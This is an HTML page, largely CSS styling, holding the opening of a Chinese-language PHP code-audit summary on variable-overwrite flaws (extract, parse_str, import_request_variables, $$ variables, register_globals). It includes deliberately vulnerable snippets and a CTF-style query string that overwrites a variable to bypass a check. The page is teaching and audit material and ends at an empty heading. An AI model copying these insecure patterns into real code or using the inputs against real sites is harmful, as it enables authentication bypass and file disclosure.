<!DOCTYPE html><html><head><meta charset="utf-8"><style>body {
  width: 45em;
  border: 1px solid #ddd;
  outline: 1300px solid #fff;
  margin: 16px auto;
}

body .markdown-body
{
  padding: 30px;
}

@font-face {
  font-family: octicons-anchor;
  src: url(data:font/woff;charset=utf-8;base64,d09GRgABAAAAAAYcAA0AAAAACjQAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABMAAAABwAAAAca8vGTk9TLzIAAAFMAAAARAAAAFZG1VHVY21hcAAAAZAAAAA+AAABQgAP9AdjdnQgAAAB0AAAAAQAAAAEACICiGdhc3AAAAHUAAAACAAAAAj//wADZ2x5ZgAAAdwAAADRAAABEKyikaNoZWFkAAACsAAAAC0AAAA2AtXoA2hoZWEAAALgAAAAHAAAACQHngNFaG10eAAAAvwAAAAQAAAAEAwAACJsb2NhAAADDAAAAAoAAAAKALIAVG1heHAAAAMYAAAAHwAAACABEAB2bmFtZQAAAzgAAALBAAAFu3I9x/Nwb3N0AAAF/AAAAB0AAAAvaoFvbwAAAAEAAAAAzBdyYwAAAADP2IQvAAAAAM/bz7t4nGNgZGFgnMDAysDB1Ml0hoGBoR9CM75mMGLkYGBgYmBlZsAKAtJcUxgcPsR8iGF2+O/AEMPsznAYKMwIkgMA5REMOXicY2BgYGaAYBkGRgYQsAHyGMF8FgYFIM0ChED+h5j//yEk/3KoSgZGNgYYk4GRCUgwMaACRoZhDwCs7QgGAAAAIgKIAAAAAf//AAJ4nHWMMQrCQBBF/0zWrCCIKUQsTDCL2EXMohYGSSmorScInsRGL2DOYJe0Ntp7BK+gJ1BxF1stZvjz/v8DRghQzEc4kIgKwiAppcA9LtzKLSkdNhKFY3HF4lK69ExKslx7Xa+vPRVS43G98vG1DnkDMIBUgFN0MDXflU8tbaZOUkXUH0+U27RoRpOIyCKjbMCVejwypzJJG4jIwb43rfl6wbwanocrJm9XFYfskuVC5K/TPyczNU7b84CXcbxks1Un6H6tLH9vf2LRnn8Ax7A5WQAAAHicY2BkYGAA4teL1+yI57f5ysDNwgAC529f0kOmWRiYVgEpDgYmEA8AUzEKsQAAAHicY2BkYGB2+O/AEMPCAAJAkpEBFbAAADgKAe0EAAAiAAAAAAQAAAAEAAAAAAAAKgAqACoAiAAAeJxjYGRgYGBhsGFgYgABEMkFhAwM/xn0QAIAD6YBhwB4nI1Ty07cMBS9QwKlQapQW3VXySvEqDCZGbGaHULiIQ1FKgjWMxknMfLEke2A+IJu+wntrt/QbVf9gG75jK577Lg8K1qQPCfnnnt8fX1NRC/pmjrk/zprC+8D7tBy9DHgBXoWfQ44Av8t4Bj4Z8CLtBL9CniJluPXASf0Lm4CXqFX8Q84dOLnMB17N4c7tBo1AS/Qi+hTwBH4rwHHwN8DXqQ30XXAS7QaLwSc0Gn8NuAVWou/gFmnjLrEaEh9GmDdDGgL3B4JsrRPDU2hTOiMSuJUIdKQQayiAth69r6akSSFqIJuA19TrzCIaY8sIoxyrNIrL//pw7A2iMygkX5vDj+G+kuoLdX4GlGK/8Lnlz6/h9MpmoO9rafrz7ILXEHHaAx95s9lsI7AHNMBWEZHULnfAXwG9/ZqdzLI08iuwRloXE8kfhXYAvE23+23DU3t626rbs8/8adv+9DWknsHp3E17oCf+Z48rvEQNZ78paYM38qfk3v/u3l3u3GXN2Dmvmvpf1Srwk3pB/VSsp512bA/GG5i2WJ7wu430yQ5K3nFGiOqgtmSB5pJVSizwaacmUZzZhXLlZTq8qGGFY2YcSkqbth6aW1tRmlaCFs2016m5qn36SbJrqosG4uMV4aP2PHBmB3tjtmgN2izkGQyLWprekbIntJFing32a5rKWCN/SdSoga45EJykyQ7asZvHQ8PTm6cslIpwyeyjbVltNikc2HTR7YKh9LBl9DADC0U/jLcBZDKrMhUBfQBvXRzLtFtjU9eNHKin0x5InTqb8lNpfKv1s1xHzTXRqgKzek/mb7nB8RZTCDhGEX3kK/8Q75AmUM/eLkfA+0Hi908Kx4eNsMgudg5GLdRD7a84npi+YxNr5i5KIbW5izXas7cHXIMAau1OueZhfj+cOcP3P8MNIWLyYOBuxL6DRylJ4cAAAB4nGNgYoAALjDJyIAOWMCiTIxMLDmZedkABtIBygAAAA==) format('woff');
}

.markdown-body {
  -ms-text-size-adjust: 100%;
  -webkit-text-size-adjust: 100%;
  color: #333;
  overflow: hidden;
  font-family: "Helvetica Neue", Helvetica, "Segoe UI", Arial, freesans, sans-serif;
  font-size: 16px;
  line-height: 1.6;
  word-wrap: break-word;
}

.markdown-body a {
  background: transparent;
}

.markdown-body a:active,
.markdown-body a:hover {
  outline: 0;
}

.markdown-body strong {
  font-weight: bold;
}

.markdown-body h1 {
  font-size: 2em;
  margin: 0.67em 0;
}

.markdown-body img {
  border: 0;
}

.markdown-body hr {
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  height: 0;
}

.markdown-body pre {
  overflow: auto;
}

.markdown-body code,
.markdown-body kbd,
.markdown-body pre {
  font-family: monospace, monospace;
  font-size: 1em;
}

.markdown-body input {
  color: inherit;
  font: inherit;
  margin: 0;
}

.markdown-body html input[disabled] {
  cursor: default;
}

.markdown-body input {
  line-height: normal;
}

.markdown-body input[type="checkbox"] {
  -moz-box-sizing: border-box;
  box-sizing: border-box;
  padding: 0;
}

.markdown-body table {
  border-collapse: collapse;
  border-spacing: 0;
}

.markdown-body td,
.markdown-body th {
  padding: 0;
}

.markdown-body * {
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body input {
  font: 13px/1.4 Helvetica, arial, freesans, clean, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol";
}

.markdown-body a {
  color: #4183c4;
  text-decoration: none;
}

.markdown-body a:hover,
.markdown-body a:focus,
.markdown-body a:active {
  text-decoration: underline;
}

.markdown-body hr {
  height: 0;
  margin: 15px 0;
  overflow: hidden;
  background: transparent;
  border: 0;
  border-bottom: 1px solid #ddd;
}

.markdown-body hr:before {
  display: table;
  content: "";
}

.markdown-body hr:after {
  display: table;
  clear: both;
  content: "";
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  margin-top: 15px;
  margin-bottom: 15px;
  line-height: 1.1;
}

.markdown-body h1 {
  font-size: 30px;
}

.markdown-body h2 {
  font-size: 21px;
}

.markdown-body h3 {
  font-size: 16px;
}

.markdown-body h4 {
  font-size: 14px;
}

.markdown-body h5 {
  font-size: 12px;
}

.markdown-body h6 {
  font-size: 11px;
}

.markdown-body blockquote {
  margin: 0;
}

.markdown-body ul,
.markdown-body ol {
  padding: 0;
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body ol ol,
.markdown-body ul ol {
  list-style-type: lower-roman;
}

.markdown-body ul ul ol,
.markdown-body ul ol ol,
.markdown-body ol ul ol,
.markdown-body ol ol ol {
  list-style-type: lower-alpha;
}

.markdown-body dd {
  margin-left: 0;
}

.markdown-body code {
  font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
}

.markdown-body pre {
  margin-top: 0;
  margin-bottom: 0;
  font: 12px Consolas, "Liberation Mono", Menlo, Courier, monospace;
}

.markdown-body .octicon {
  font: normal normal 16px octicons-anchor;
  line-height: 1;
  display: inline-block;
  text-decoration: none;
  -webkit-font-smoothing: antialiased;
  -moz-osx-font-smoothing: grayscale;
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}

.markdown-body .octicon-link:before {
  content: '\f05c';
}

.markdown-body>*:first-child {
  margin-top: 0 !important;
}

.markdown-body>*:last-child {
  margin-bottom: 0 !important;
}

.markdown-body .anchor {
  position: absolute;
  top: 0;
  bottom: 0;
  left: 0;
  display: block;
  padding-right: 6px;
  padding-left: 30px;
  margin-left: -30px;
}

.markdown-body .anchor:focus {
  outline: none;
}

.markdown-body h1,
.markdown-body h2,
.markdown-body h3,
.markdown-body h4,
.markdown-body h5,
.markdown-body h6 {
  position: relative;
  margin-top: 1em;
  margin-bottom: 16px;
  font-weight: bold;
  line-height: 1.4;
}

.markdown-body h1 .octicon-link,
.markdown-body h2 .octicon-link,
.markdown-body h3 .octicon-link,
.markdown-body h4 .octicon-link,
.markdown-body h5 .octicon-link,
.markdown-body h6 .octicon-link {
  display: none;
  color: #000;
  vertical-align: middle;
}

.markdown-body h1:hover .anchor,
.markdown-body h2:hover .anchor,
.markdown-body h3:hover .anchor,
.markdown-body h4:hover .anchor,
.markdown-body h5:hover .anchor,
.markdown-body h6:hover .anchor {
  padding-left: 8px;
  margin-left: -30px;
  line-height: 1;
  text-decoration: none;
}

.markdown-body h1:hover .anchor .octicon-link,
.markdown-body h2:hover .anchor .octicon-link,
.markdown-body h3:hover .anchor .octicon-link,
.markdown-body h4:hover .anchor .octicon-link,
.markdown-body h5:hover .anchor .octicon-link,
.markdown-body h6:hover .anchor .octicon-link {
  display: inline-block;
}

.markdown-body h1 {
  padding-bottom: 0.3em;
  font-size: 2.25em;
  line-height: 1.2;
  border-bottom: 1px solid #eee;
}

.markdown-body h2 {
  padding-bottom: 0.3em;
  font-size: 1.75em;
  line-height: 1.225;
  border-bottom: 1px solid #eee;
}

.markdown-body h3 {
  font-size: 1.5em;
  line-height: 1.43;
}

.markdown-body h4 {
  font-size: 1.25em;
}

.markdown-body h5 {
  font-size: 1em;
}

.markdown-body h6 {
  font-size: 1em;
  color: #777;
}

.markdown-body p,
.markdown-body blockquote,
.markdown-body ul,
.markdown-body ol,
.markdown-body dl,
.markdown-body table,
.markdown-body pre {
  margin-top: 0;
  margin-bottom: 16px;
}

.markdown-body hr {
  height: 4px;
  padding: 0;
  margin: 16px 0;
  background-color: #e7e7e7;
  border: 0 none;
}

.markdown-body ul,
.markdown-body ol {
  padding-left: 2em;
}

.markdown-body ul ul,
.markdown-body ul ol,
.markdown-body ol ol,
.markdown-body ol ul {
  margin-top: 0;
  margin-bottom: 0;
}

.markdown-body li>p {
  margin-top: 16px;
}

.markdown-body dl {
  padding: 0;
}

.markdown-body dl dt {
  padding: 0;
  margin-top: 16px;
  font-size: 1em;
  font-style: italic;
  font-weight: bold;
}

.markdown-body dl dd {
  padding: 0 16px;
  margin-bottom: 16px;
}

.markdown-body blockquote {
  padding: 0 15px;
  color: #777;
  border-left: 4px solid #ddd;
}

.markdown-body blockquote>:first-child {
  margin-top: 0;
}

.markdown-body blockquote>:last-child {
  margin-bottom: 0;
}

.markdown-body table {
  display: block;
  width: 100%;
  overflow: auto;
  word-break: normal;
  word-break: keep-all;
}

.markdown-body table th {
  font-weight: bold;
}

.markdown-body table th,
.markdown-body table td {
  padding: 6px 13px;
  border: 1px solid #ddd;
}

.markdown-body table tr {
  background-color: #fff;
  border-top: 1px solid #ccc;
}

.markdown-body table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

.markdown-body img {
  max-width: 100%;
  -moz-box-sizing: border-box;
  box-sizing: border-box;
}

.markdown-body code {
  padding: 0;
  padding-top: 0.2em;
  padding-bottom: 0.2em;
  margin: 0;
  font-size: 85%;
  background-color: rgba(0,0,0,0.04);
  border-radius: 3px;
}

.markdown-body code:before,
.markdown-body code:after {
  letter-spacing: -0.2em;
  content: "\00a0";
}

.markdown-body pre>code {
  padding: 0;
  margin: 0;
  font-size: 100%;
  word-break: normal;
  white-space: pre;
  background: transparent;
  border: 0;
}

.markdown-body .highlight {
  margin-bottom: 16px;
}

.markdown-body .highlight pre,
.markdown-body pre {
  padding: 16px;
  overflow: auto;
  font-size: 85%;
  line-height: 1.45;
  background-color: #f7f7f7;
  border-radius: 3px;
}

.markdown-body .highlight pre {
  margin-bottom: 0;
  word-break: normal;
}

.markdown-body pre {
  word-wrap: normal;
}

.markdown-body pre code {
  display: inline;
  max-width: initial;
  padding: 0;
  margin: 0;
  overflow: initial;
  line-height: inherit;
  word-wrap: normal;
  background-color: transparent;
  border: 0;
}

.markdown-body pre code:before,
.markdown-body pre code:after {
  content: normal;
}

.markdown-body .highlight {
  background: #fff;
}

.markdown-body .highlight .h {
  color: #333;
  font-style: normal;
  font-weight: normal;
}

.markdown-body .highlight .mf,
.markdown-body .highlight .mh,
.markdown-body .highlight .mi,
.markdown-body .highlight .mo,
.markdown-body .highlight .il,
.markdown-body .highlight .m {
  color: #945277;
}

.markdown-body .highlight .s,
.markdown-body .highlight .sb,
.markdown-body .highlight .sc,
.markdown-body .highlight .sd,
.markdown-body .highlight .s2,
.markdown-body .highlight .se,
.markdown-body .highlight .sh,
.markdown-body .highlight .si,
.markdown-body .highlight .sx,
.markdown-body .highlight .s1 {
  color: #df5000;
}

.markdown-body .highlight .kc,
.markdown-body .highlight .kd,
.markdown-body .highlight .kn,
.markdown-body .highlight .kp,
.markdown-body .highlight .kr,
.markdown-body .highlight .kt,
.markdown-body .highlight .k,
.markdown-body .highlight .o {
  font-weight: bold;
}

.markdown-body .highlight .kt {
  color: #458;
}

.markdown-body .highlight .c,
.markdown-body .highlight .cm,
.markdown-body .highlight .c1 {
  color: #998;
  font-style: italic;
}

.markdown-body .highlight .cp,
.markdown-body .highlight .cs,
.markdown-body .highlight .cp .h {
  color: #999;
  font-weight: bold;
}

.markdown-body .highlight .cs {
  font-style: italic;
}

.markdown-body .highlight .n {
  color: #333;
}

.markdown-body .highlight .na,
.markdown-body .highlight .nv,
.markdown-body .highlight .vc,
.markdown-body .highlight .vg,
.markdown-body .highlight .vi {
  color: #008080;
}

.markdown-body .highlight .nb {
  color: #0086B3;
}

.markdown-body .highlight .nc {
  color: #458;
  font-weight: bold;
}

.markdown-body .highlight .no {
  color: #094e99;
}

.markdown-body .highlight .ni {
  color: #800080;
}

.markdown-body .highlight .ne {
  color: #990000;
  font-weight: bold;
}

.markdown-body .highlight .nf {
  color: #945277;
  font-weight: bold;
}

.markdown-body .highlight .nn {
  color: #555;
}

.markdown-body .highlight .nt {
  color: #000080;
}

.markdown-body .highlight .err {
  color: #a61717;
  background-color: #e3d2d2;
}

.markdown-body .highlight .gd {
  color: #000;
  background-color: #fdd;
}

.markdown-body .highlight .gd .x {
  color: #000;
  background-color: #faa;
}

.markdown-body .highlight .ge {
  font-style: italic;
}

.markdown-body .highlight .gr {
  color: #aa0000;
}

.markdown-body .highlight .gh {
  color: #999;
}

.markdown-body .highlight .gi {
  color: #000;
  background-color: #dfd;
}

.markdown-body .highlight .gi .x {
  color: #000;
  background-color: #afa;
}

.markdown-body .highlight .go {
  color: #888;
}

.markdown-body .highlight .gp {
  color: #555;
}

.markdown-body .highlight .gs {
  font-weight: bold;
}

.markdown-body .highlight .gu {
  color: #800080;
  font-weight: bold;
}

.markdown-body .highlight .gt {
  color: #aa0000;
}

.markdown-body .highlight .ow {
  font-weight: bold;
}

.markdown-body .highlight .w {
  color: #bbb;
}

.markdown-body .highlight .sr {
  color: #017936;
}

.markdown-body .highlight .ss {
  color: #8b467f;
}

.markdown-body .highlight .bp {
  color: #999;
}

.markdown-body .highlight .gc {
  color: #999;
  background-color: #EAF2F5;
}

.markdown-body kbd {
  background-color: #e7e7e7;
  background-image: -webkit-linear-gradient(#fefefe, #e7e7e7);
  background-image: linear-gradient(#fefefe, #e7e7e7);
  background-repeat: repeat-x;
  display: inline-block;
  padding: 3px 5px;
  font: 11px Consolas, "Liberation Mono", Menlo, Courier, monospace;
  line-height: 10px;
  color: #000;
  border: 1px solid #cfcfcf;
  border-radius: 2px;
}

.markdown-body .highlight .pl-coc,
.markdown-body .highlight .pl-entm,
.markdown-body .highlight .pl-eoa,
.markdown-body .highlight .pl-mai .pl-sf,
.markdown-body .highlight .pl-pdv,
.markdown-body .highlight .pl-sc,
.markdown-body .highlight .pl-sr,
.markdown-body .highlight .pl-v,
.markdown-body .highlight .pl-vpf {
  color: #0086b3;
}

.markdown-body .highlight .pl-eoac,
.markdown-body .highlight .pl-mdht,
.markdown-body .highlight .pl-mi1,
.markdown-body .highlight .pl-mri,
.markdown-body .highlight .pl-va,
.markdown-body .highlight .pl-vpu {
  color: #008080;
}

.markdown-body .highlight .pl-c,
.markdown-body .highlight .pl-pdc {
  color: #b4b7b4;
  font-style: italic;
}

.markdown-body .highlight .pl-k,
.markdown-body .highlight .pl-ko,
.markdown-body .highlight .pl-kolp,
.markdown-body .highlight .pl-mc,
.markdown-body .highlight .pl-mr,
.markdown-body .highlight .pl-ms,
.markdown-body .highlight .pl-s,
.markdown-body .highlight .pl-sok,
.markdown-body .highlight .pl-st {
  color: #6e5494;
}

.markdown-body .highlight .pl-ef,
.markdown-body .highlight .pl-enf,
.markdown-body .highlight .pl-enm,
.markdown-body .highlight .pl-entc,
.markdown-body .highlight .pl-eoi,
.markdown-body .highlight .pl-sf,
.markdown-body .highlight .pl-smc {
  color: #d12089;
}

.markdown-body .highlight .pl-ens,
.markdown-body .highlight .pl-eoai,
.markdown-body .highlight .pl-kos,
.markdown-body .highlight .pl-mh .pl-pdh,
.markdown-body .highlight .pl-mp,
.markdown-body .highlight .pl-pde,
.markdown-body .highlight .pl-stp {
  color: #458;
}

.markdown-body .highlight .pl-enti {
  color: #d12089;
  font-weight: bold;
}

.markdown-body .highlight .pl-cce,
.markdown-body .highlight .pl-enc,
.markdown-body .highlight .pl-kou,
.markdown-body .highlight .pl-mq {
  color: #f93;
}

.markdown-body .highlight .pl-mp1 .pl-sf {
  color: #458;
  font-weight: bold;
}

.markdown-body .highlight .pl-cos,
.markdown-body .highlight .pl-ent,
.markdown-body .highlight .pl-md,
.markdown-body .highlight .pl-mdhf,
.markdown-body .highlight .pl-ml,
.markdown-body .highlight .pl-pdc1,
.markdown-body .highlight .pl-pds,
.markdown-body .highlight .pl-s1,
.markdown-body .highlight .pl-scp,
.markdown-body .highlight .pl-sol {
  color: #df5000;
}

.markdown-body .highlight .pl-c1,
.markdown-body .highlight .pl-cn,
.markdown-body .highlight .pl-pse,
.markdown-body .highlight .pl-pse .pl-s2,
.markdown-body .highlight .pl-vi {
  color: #a31515;
}

.markdown-body .highlight .pl-mb,
.markdown-body .highlight .pl-pdb {
  color: #df5000;
  font-weight: bold;
}

.markdown-body .highlight .pl-mi,
.markdown-body .highlight .pl-pdi {
  color: #6e5494;
  font-style: italic;
}

.markdown-body .highlight .pl-ms1 {
  background-color: #f5f5f5;
}

.markdown-body .highlight .pl-mdh,
.markdown-body .highlight .pl-mdi {
  font-weight: bold;
}

.markdown-body .highlight .pl-mdr {
  color: #0086b3;
  font-weight: bold;
}

.markdown-body .highlight .pl-s2 {
  color: #333;
}

.markdown-body .highlight .pl-ii {
  background-color: #df5000;
  color: #fff;
}

.markdown-body .highlight .pl-ib {
  background-color: #f93;
}

.markdown-body .highlight .pl-id {
  background-color: #a31515;
  color: #fff;
}

.markdown-body .highlight .pl-iu {
  background-color: #b4b7b4;
}

.markdown-body .highlight .pl-mo {
  color: #969896;
}

.markdown-body .task-list-item {
  list-style-type: none;
}

.markdown-body .task-list-item+.task-list-item {
  margin-top: 3px;
}

.markdown-body .task-list-item input {
  float: left;
  margin: 0.3em 0 0.25em -1.6em;
  vertical-align: middle;
}</style><title>PHP代码审计归纳</title></head><body><article class="markdown-body"><h1>
<a id="user-content-php代码审计归纳" class="anchor" href="#php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>PHP代码审计归纳</h1>
<p>Author: 木禾 ali0th</p>
<h2>
<a id="user-content-变量覆盖" class="anchor" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>变量覆盖</h2>
<h3>
<a id="user-content-extract" class="anchor" href="#extract" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>extract()</h3>
<p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-smi">$a</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>Original<span class="pl-pds">"</span></span>;</span>
<span class="pl-s1"><span class="pl-smi">$my_array</span> <span class="pl-k">=</span> <span class="pl-c1">array</span>(<span class="pl-s"><span class="pl-pds">"</span>a<span class="pl-pds">"</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>Cat<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>b<span class="pl-pds">"</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>Dog<span class="pl-pds">"</span></span>, <span class="pl-s"><span class="pl-pds">"</span>c<span class="pl-pds">"</span></span> <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">"</span>Horse<span class="pl-pds">"</span></span>);</span>
<span class="pl-s1"><span class="pl-c1">extract</span>(<span class="pl-smi">$my_array</span>); </span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\$</span>a = <span class="pl-smi">$a</span>; <span class="pl-cce">\$</span>b = <span class="pl-smi">$b</span>; <span class="pl-cce">\$</span>c = <span class="pl-smi">$c</span><span class="pl-pds">"</span></span>;</span>
<span class="pl-s1"></span><span class="pl-pse"><span class="pl-s1">?</span>&gt;</span>
# 结果：$a = Cat; $b = Dog; $c = Horse</pre></div>
<p>这里原来是$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span>?shiyan=&amp;flag=1</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?<span class="pl-c1">php</span></span>
<span class="pl-s1"><span class="pl-smi">$flag</span><span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">'</span>xxx<span class="pl-pds">'</span></span>; </span>
<span class="pl-s1"><span class="pl-c1">extract</span>(<span class="pl-smi">$_GET</span>);</span>
<span class="pl-s1"> <span class="pl-k">if</span>(<span class="pl-c1">isset</span>(<span class="pl-smi">$shiyan</span>))</span>
<span class="pl-s1"> { </span>
<span class="pl-s1">    <span class="pl-smi">$content</span><span class="pl-k">=</span><span class="pl-c1">trim</span>(<span class="pl-c1">file_get_contents</span>(<span class="pl-smi">$flag</span>)); <span class="pl-c"><span class="pl-c">#</span> content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0</span></span>
<span class="pl-s1">    <span class="pl-k">if</span>(<span class="pl-smi">$shiyan</span><span class="pl-k">==</span><span class="pl-smi">$content</span>)</span>
<span class="pl-s1">    { </span>
<span class="pl-s1">        <span class="pl-c1">echo</span><span class="pl-s"><span class="pl-pds">'</span>ctf{xxx}<span class="pl-pds">'</span></span>; </span>
<span class="pl-s1">    }</span>
<span class="pl-s1">   <span class="pl-k">else</span></span>
<span class="pl-s1">   { </span>
<span class="pl-s1">    <span class="pl-c1">echo</span><span class="pl-s"><span class="pl-pds">'</span>Oh.no<span class="pl-pds">'</span></span>;</span>
<span class="pl-s1">   } </span>
<span class="pl-s1">   }</span></pre></div>
<h3>
<a id="user-content-parse_str" class="anchor" href="#parse_str" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>parse_str()</h3>
<p>解析字符串并注册成变量</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-smi">$b</span><span class="pl-k">=</span><span class="pl-c1">1</span>;</span>
<span class="pl-s1"><span class="pl-c1">Parse_str</span>(<span class="pl-s"><span class="pl-pds">'</span>b=2<span class="pl-pds">'</span></span>);</span>
<span class="pl-s1"><span class="pl-c1">Print_r</span>(<span class="pl-smi">$b</span>);</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span> 结果: $b=2</span></span></pre></div>
<h3>
<a id="user-content-import_request_variables" class="anchor" href="#import_request_variables" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>import_request_variables()</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1">将 <span class="pl-c1">GET</span><span class="pl-k">/</span><span class="pl-c1">POST</span><span class="pl-k">/</span><span class="pl-c1">Cookie</span> 变量导入到全局作用域中，全局变量注册。</span>
<span class="pl-s1">在<span class="pl-c1">5.4</span>之后被取消，只可在<span class="pl-c1">4</span><span class="pl-k">-</span><span class="pl-c1">4.1</span><span class="pl-k">.</span><span class="pl-c1">0</span>和<span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">5.4</span><span class="pl-k">.</span><span class="pl-c1">0</span>可用。</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span>导入POST提交的变量值，前缀为post_</span></span>
<span class="pl-s1">import_request_variable(<span class="pl-s"><span class="pl-pds">"</span>p<span class="pl-pds">"</span></span>， <span class="pl-s"><span class="pl-pds">"</span>post_<span class="pl-pds">"</span></span>);</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span>导入GET和POST提交的变量值，前缀为gp_，GET优先于POST</span></span>
<span class="pl-s1">import_request_variable(<span class="pl-s"><span class="pl-pds">"</span>gp<span class="pl-pds">"</span></span>， <span class="pl-s"><span class="pl-pds">"</span>gp_<span class="pl-pds">"</span></span>);</span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span>导入Cookie和GET的变量值，Cookie变量值优先于GET</span></span>
<span class="pl-s1">import_request_variable(<span class="pl-s"><span class="pl-pds">"</span>cg<span class="pl-pds">"</span></span>， <span class="pl-s"><span class="pl-pds">"</span>cg_<span class="pl-pds">"</span></span>);</span></pre></div>
<h3>
<a id="user-content-变量覆盖-1" class="anchor" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-1" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>$$变量覆盖</h3>
<div class="highlight highlight-text-html-php"><pre><span class="pl-s1"><span class="pl-c"><span class="pl-c">#</span># 提交参数chs，则可覆盖变量"$chs"的值。$key为chs时，$$key就变成$chs</span></span>
<span class="pl-s1"><span class="pl-k">&lt;</span>?  </span>
<span class="pl-s1"><span class="pl-smi">$chs</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>;  </span>
<span class="pl-s1"><span class="pl-k">if</span>(<span class="pl-smi">$_POST</span> <span class="pl-k">&amp;&amp;</span> <span class="pl-smi">$charset</span> <span class="pl-k">!</span><span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>utf-8<span class="pl-pds">'</span></span>){  </span>
<span class="pl-s1">    <span class="pl-smi">$chs</span> <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-c1">Chinese</span>(<span class="pl-s"><span class="pl-pds">'</span>UTF-8<span class="pl-pds">'</span></span>, <span class="pl-smi">$charset</span>);  </span>
<span class="pl-s1">    <span class="pl-k">foreach</span>(<span class="pl-smi">$_POST</span> <span class="pl-k">as</span> <span class="pl-smi">$key</span> <span class="pl-k">=&gt;</span> <span class="pl-smi">$value</span>){  </span>
<span class="pl-s1">        <span class="pl-smi">$$key</span> <span class="pl-k">=</span> <span class="pl-smi">$chs</span><span class="pl-k">-&gt;</span>Convert(<span class="pl-smi">$value</span>);  </span>
<span class="pl-s1">    }  </span>
<span class="pl-s1">    <span class="pl-c1">unset</span>(<span class="pl-smi">$chs</span>);  </span>
<span class="pl-s1">} </span></pre></div>
<h3>
<a id="user-content-全局变量覆盖漏洞" class="anchor" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>全局变量覆盖漏洞</h3>
<p>原理：
register_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。
如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.</p>
<p>$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。</p>
<div class="highlight highlight-text-html-php"><pre><span class="pl-pse">&lt;?php</span><span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span> register_globals =ON</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span>foo.php?GLOBALS[foobar]=HELLO</span></span>
<span class="pl-s1"><span class="pl-c1">echo</span> <span class="pl-smi">$foobar</span>;</span>
<span class="pl-s1"></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span>为了安全取消全局变量</span></span>
<span class="pl-s1"><span class="pl-c"><span class="pl-c">//</span>var.php?GLOBALS[a]=aaaa&amp;b=111</span></span>
<span class="pl-s1"><span class="pl-k">if</span> (<span class="pl-c1">ini_get</span>(<span class="pl-s"><span class="pl-pds">"</span>register_globals<span class="pl-pds">"</span></span>)) <span class="pl-k">foreach</span>(<span class="pl-smi">$_REQUEST</span> <span class="pl-k">as</span> <span class="pl-smi">$k</span><span class="pl-k">=&gt;</span><span class="pl-smi">$v</span>) <span class="pl-c1">unset</span>(${<span class="pl-smi">$k</span>});</span>
<span class="pl-s1"><span class="pl-c1">print</span> <span class="pl-smi">$a</span>;</span>
<span class="pl-s1"><span class="pl-c1">print</span> <span class="pl-smi">$_GET</span>[<span class="pl-c1">b</span>]; </span></pre></div>
<p>经过测试，开了register_globals会卡死</p>
<h2>
